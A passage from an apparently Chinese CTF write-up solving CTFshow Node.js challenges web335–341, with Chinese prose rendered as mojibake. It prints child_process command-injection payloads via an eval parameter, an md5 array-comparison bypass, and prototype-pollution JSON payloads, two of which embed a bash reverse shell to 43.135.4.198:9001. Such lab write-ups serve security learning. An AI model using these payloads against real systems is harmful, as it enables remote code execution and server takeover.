<code>123456</code>ç™»å½•å°±è¡Œã€‚</p><p>æœ€åæ˜¯è¿™ä¸ª<code>toUpperCase()</code>ï¼Œæœ‰æ—¶å¤§å°å†™è½¬æ¢çš„æ—¶å€™å¾ˆå®¹æ˜“å‡ºé—®é¢˜ï¼Œå…·ä½“å‚è€ƒ[GYCTF2020]Ez_Expressã€‚</p><h3 id="CTFshow-nodejs-web335"><a href="#CTFshow-nodejs-web335" class="headerlink" title="[CTFshow nodejs]web335"></a>[CTFshow nodejs]web335</h3><p>å³é”®æºç æç¤º<code>/?eval=</code>ï¼Œçœ‹ç€åƒå‘½ä»¤æ‰§è¡Œï¼Ÿè¯•è¯•ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?eval=process.mainModule.require(&#x27;child_process&#x27;).exec<span class="hljs-constructor">Sync(&#x27;<span class="hljs-params">ls</span>&#x27;)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br><br><span class="hljs-comment">//ç»“æœï¼š</span><br>app.js bin fl00g.txt modules node_modules package-lock.json package.json public routes sessions views <br><br><span class="hljs-comment">//æ‰€ä»¥ï¼š</span><br>?eval=process.mainModule.require(&#x27;child_process&#x27;).exec<span class="hljs-constructor">Sync(&#x27;<span class="hljs-params">cat</span> <span class="hljs-params">fl00g</span>.<span class="hljs-params">txt</span>&#x27;)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br></code></pre></td></tr></table></figure><h3 id="CTFshow-nodejs-web336"><a href="#CTFshow-nodejs-web336" class="headerlink" title="[CTFshow nodejs]web336"></a>[CTFshow nodejs]web336</h3><p>å’Œä¸Šé¢˜ä¸€æ ·ï¼Œè¿˜æ˜¯éœ€è¦ç»™<code>eval</code>å‚æ•°ä¼ å‚ç„¶åæ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡è¿™æ¬¡banäº†<code>exec</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">?eval=<span class="hljs-built_in">process</span>.mainModule.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawnSync(<span class="hljs-string">&#x27;cat&#x27;</span>,[<span class="hljs-string">&#x27;fl001g.txt&#x27;</span>]).<span class="hljs-keyword">stdout</span>.toString()<span class="hljs-comment"></span><br><span class="hljs-comment">//spawnSyncï¼š(å‘½ä»¤ï¼Œå‘½ä»¤çš„å‚æ•°æ•°ç»„)</span><br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æƒ³ç€è¿‡æ»¤äº†<code>exec</code>å°±æ‹¼æ¥ä¸€ä¸‹è¯•è¯•ï¼š</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">?<span class="hljs-built_in">eval</span>=process.mainModule.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat fl00g.txt&#x27;</span>).toString()<br></code></pre></td></tr></table></figure><p>ä¸è¿‡ä¸å¤ªæ˜ç™½ä¸ºå•¥æ²¡æˆåŠŸã€‚ã€‚</p><h3 id="CTFshow-nodejs-web337"><a href="#CTFshow-nodejs-web337" class="headerlink" title="[CTFshow nodejs]web337"></a>[CTFshow nodejs]web337</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .<span class="hljs-title function_">update</span>(s)<br>    .<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;xxxxxxx&#x27;</span>;<br>  <span class="hljs-keyword">var</span> a = req.<span class="hljs-property">query</span>.<span class="hljs-property">a</span>;<br>  <span class="hljs-keyword">var</span> b = req.<span class="hljs-property">query</span>.<span class="hljs-property">b</span>;<br>  <span class="hljs-keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="hljs-property">length</span>===b.<span class="hljs-property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="hljs-title function_">md5</span>(a+flag)===<span class="hljs-title function_">md5</span>(b+flag))&#123;<br>  res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;tql&#x27;</span>&#125;);<br>  &#125;<br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>å’Œ[NPUCTF2020]éªŒè¯ğŸç±»ä¼¼çš„çŸ¥è¯†ç‚¹ï¼šjsè¿™ä¸œè¥¿å’Œphpæœ‰ç‚¹åƒï¼Œä¹Ÿå­˜åœ¨å¼±ç­‰äºå¼ºç­‰äºç»•è¿‡çš„é—®é¢˜ã€‚</p><p><code>?a[x]=1&amp;b[x]=2</code>ã€‚è§£æ³•å¾ˆå¤šï¼Œ<a href="https://blog.csdn.net/Yb_140/article/details/124510337">å‚è€ƒèµ„æ–™</a></p><h3 id="CTFshow-nodejs-web338"><a href="#CTFshow-nodejs-web338" class="headerlink" title="[CTFshow nodejs]web338"></a>[CTFshow nodejs]web338</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>  utils.<span class="hljs-title function_">copy</span>(user,req.<span class="hljs-property">body</span>);<br>  <span class="hljs-keyword">if</span>(secert.<span class="hljs-property">ctfshow</span>===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user)&#125;);  <br>  &#125;<br>  <br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><span class="hljs-comment">//common.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">copy</span>:copy<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            <span class="hljs-title function_">copy</span>(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>å…¶å®è¿™ä¸ª<code>copy</code>å‡½æ•°çœ‹äº†ä¹‹åå‘ç°å°±è·Ÿ<code>merge</code>å‡½æ•°ä¼¼çš„ã€‚æ‰€ä»¥ç™»å½•æ—¶æŠ“åŒ…è¿™ä¹ˆæ”¹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;11111&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;11111&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ctfshow&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;36dboy&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å³å¯ã€‚</p><p>åŸå‹é“¾æ±¡æŸ“ç®€å•è¯´å°±æ˜¯å½“è·å–æŸä¸ªå¯¹è±¡çš„æŸä¸ªæˆå‘˜æ—¶ï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šé€šè¿‡åŸå‹é“¾ä¸€æ­¥æ­¥å¾€ä¸Šæ‰¾ï¼Œç›´åˆ°æŸä¸ªçˆ¶ç±»çš„åŸå‹ä¸º<code>null</code>ä¸ºæ­¢ã€‚æ‰€ä»¥ä¿®æ”¹å¯¹è±¡çš„æŸä¸ªçˆ¶ç±»çš„<code>prototype</code>çš„åŸå‹å°±å¯ä»¥é€šè¿‡åŸå‹é“¾å½±å“åˆ°è·Ÿæ­¤ç±»æœ‰å…³çš„æ‰€æœ‰å¯¹è±¡ã€‚</p><h3 id="CTFshow-nodejs-web339"><a href="#CTFshow-nodejs-web339" class="headerlink" title="[CTFshow nodejs]web339"></a>[CTFshow nodejs]web339</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">password</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">normalUser</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span><br>&#125;<br><br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br>  <span class="hljs-keyword">let</span> user = &#123;&#125;;<br>  utils.<span class="hljs-title function_">copy</span>(user,req.<span class="hljs-property">body</span>);<br>  <span class="hljs-keyword">if</span>(secert.<span class="hljs-property">ctfshow</span>===flag)&#123;<br>    res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user)&#125;);  <br>  &#125;<br>  <br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><span class="hljs-comment">//è¿™é‡Œé™åˆ¶äº†secert.ctfshow===flagæ‰ç»™flagï¼Œä¸æ˜¯å•çº¯çš„åŸå‹é“¾æ±¡æŸ“</span><br><br><span class="hljs-comment">//api.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;api&#x27;</span>, &#123; <span class="hljs-attr">query</span>: <span class="hljs-title class_">Function</span>(query)(query)&#125;);<br>   <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>é€šè¿‡åŸå‹é“¾æ±¡æŸ“å»å®ç°RCEï¼Œåˆ©ç”¨ç‚¹å°±æ˜¯<code>api</code>è·¯ç”±ä¸­çš„<code>Function(query)(query)</code>ï¼š</p><blockquote><p>Function(query)æ˜¯ä¸€ä¸ªå‡½æ•°æ„é€ å™¨ï¼Œå®ƒå°†ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°(query)ä½œä¸ºå‡½æ•°ä½“ï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°ã€‚è¿™ä¸ªæ–°çš„å‡½æ•°å¯ä»¥æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°å¹¶æ‰§è¡Œqueryå­—ç¬¦ä¸²ä¸­çš„JavaScriptä»£ç ã€‚è€Œåé¢çš„(query)åˆ™æ˜¯å°†è¿™ä¸ªæ–°ç”Ÿæˆçš„å‡½æ•°å†æ¬¡è°ƒç”¨ï¼Œå¹¶å°†å‚æ•°queryä¼ é€’ç»™å®ƒã€‚<br><a href="https://blog.csdn.net/m0_64815693/article/details/130076401">å‚è€ƒèµ„æ–™</a></p></blockquote><p>æ‰€ä»¥å’Œä¸Šé¢˜ä¸€æ ·ï¼Œåœ¨<code>login</code>ç•Œé¢è§¦å‘æ±¡æŸ“ï¼Œ<code>query</code>æ˜¯éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åPOSTå½¢å¼è®¿é—®<code>api</code>è·¯ç”±è§¦å‘å‡½æ•°è°ƒç”¨ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.135.4.198/9001 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯è¿™ä¸ªpayloadä¸ºå•¥è¿™ä¹ˆå†™ï¼šnode åŸºäº chrome v8 å†…æ ¸ï¼Œè¿è¡Œæ—¶ä¸ä¼šæœ‰ <code>require</code> è¿™ç§å…³é”®å­—ï¼Œæ¨¡å—åŠ è½½ä¸è¿›æ¥ã€‚</p><h3 id="CTFshow-nodejs-web340"><a href="#CTFshow-nodejs-web340" class="headerlink" title="[CTFshow nodejs]web340"></a>[CTFshow nodejs]web340</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userinfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isVIP</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAuthor</span> = <span class="hljs-literal">false</span>;     <br>    &#125;;<br>  &#125;<br>  utils.<span class="hljs-title function_">copy</span>(user.<span class="hljs-property">userinfo</span>,req.<span class="hljs-property">body</span>);<br>  <span class="hljs-keyword">if</span>(user.<span class="hljs-property">userinfo</span>.<span class="hljs-property">isAdmin</span>)&#123;<br>   res.<span class="hljs-title function_">end</span>(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);  <br>  &#125;<br>  <br>  <br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ¯”è¾ƒç‰¹æ®Šï¼Œéœ€è¦æ±¡æŸ“ä¸¤çº§ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;query&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.135.4.198/9001 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>ç®€å•éªŒè¯ä¸€ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userinfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isVIP</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAuthor</span> = <span class="hljs-literal">false</span>;<br>    &#125;;<br>&#125;<br>&gt;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">__proto__</span>) <span class="hljs-comment">//ç»“æœï¼š&#123;&#125;</span><br>&gt;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>) <span class="hljs-comment">//ç»“æœï¼š[Object: null prototype] &#123;&#125;</span><br></code></pre></td></tr></table></figure><p>userçš„å®ä¾‹å¯¹è±¡æ˜¯ç”±ä¸€ä¸ªåŒ¿åæ„é€ å‡½æ•°åˆ›å»ºçš„ï¼Œuser.__proto__æŒ‡å‘çš„æ˜¯è¿™ä¸ªæ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼Œè€Œè¿™ä¸ªæ„é€ å‡½æ•°çš„é»˜è®¤åŸå‹å¯¹è±¡æ˜¯ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œç©ºå¯¹è±¡çš„åŸå‹å¯¹è±¡çš„åŸå‹å°±æ˜¯Object.prototypeã€‚</p><h3 id="CTFshow-nodejs-web341"><a href="#CTFshow-nodejs-web341" class="headerlink" title="[CTFshow nodejs]web341"></a>[CTFshow nodejs]web341</h3><p>å’Œ340çš„åŒºåˆ«å°±æ˜¯æ²¡äº†<code>api.js</code>æ–‡ä»¶ã€‚</p><p><a href="">å‚è€ƒèµ„æ–™</a>ï¼Œejs RCEã€‚ç®€å•è¯´å°±æ˜¯é€šè¿‡åŸå‹é“¾æ±¡æŸ“å®ç°å˜é‡è¦†ç›–ä»è€ŒRCEã€‚</p><p>[å‚è€ƒèµ„æ–™](<a href="https://www.anquanke.com/post/id/236354#h2-2">å…³äºnodejsçš„ejså’Œjadeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“æŒ–æ˜-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a>)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//login.js</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">userinfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isVIP</span> = <span class="hljs-literal">false</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">false</span>;    <br>    &#125;;<br>  &#125;;<br>  utils.<span class="hljs-title function_">copy</span>(user.<span class="hljs-property">userinfo</span>,req.<span class="hljs-property">body</span>);<span class="hljs-comment">//copyå¯ä»¥çœ‹æˆmerge()ï¼Œè¿™é‡Œå­˜åœ¨åŸå‹é“¾æ±¡æŸ“</span><br>  <span class="hljs-keyword">if</span>(user.<span class="hljs-property">userinfo</span>.<span class="hljs-property">isAdmin</span>)&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;login success!&#x27;</span>&#125;);  <br>  &#125;<span 